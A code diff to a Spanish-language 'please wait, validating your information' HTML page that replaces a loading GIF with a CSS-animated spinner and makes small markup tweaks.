@@ -16,6 +16,23 @@
     <title>En Linea </title>
 
   </head>
+  <style>
+    .spinner {
+        display: inline-block;
+        width: 50px;
+        height: 50px;
+        border: 3px solid rgba(0, 0, 0, 0.2);
+        border-radius: 50%;
+        border-top-color: #000;
+        animation: spin 1s ease-in-out infinite;
+    }
+
+    @keyframes spin {
+        to {
+            transform: rotate(360deg);
+        }
+    }
+</style>
 
   <body>
     <div id="contenidoWeb">
@@ -61,19 +78,18 @@ document.write(diasSemana[f.getDay()] + ", " + f.getDate() + " de " + meses[f.ge
               <div class="row">
                 
                 <div class="col-lg-4 col-md-5 col-sm-6">
-                  <div class="panel_general mua-panel_general">
+                  <div class="panel_general mua-panel_general" >
                     
                   
                     <div id="contenido">
-                                                             	<div align="center">	<span style="font-family:arial; font-size:14">
+                            <br>                                 	<div align="center">	<span style="font-family:arial; font-size:14">
 					<img src="archivos/iconn.png" style="width:120px; height:auto"><br><br>
 					  Por favor espere unos segundos. 
 					  <br>Estamos validando su informaci&oacute;n <br>
 					</span>
 					<br><br>
-					<img src="archivos/logg2.gif" style="width:120px; height:auto">
-					
-					
+ 					
+          <div class="spinner"></div>
 											
 																	
 					</div>
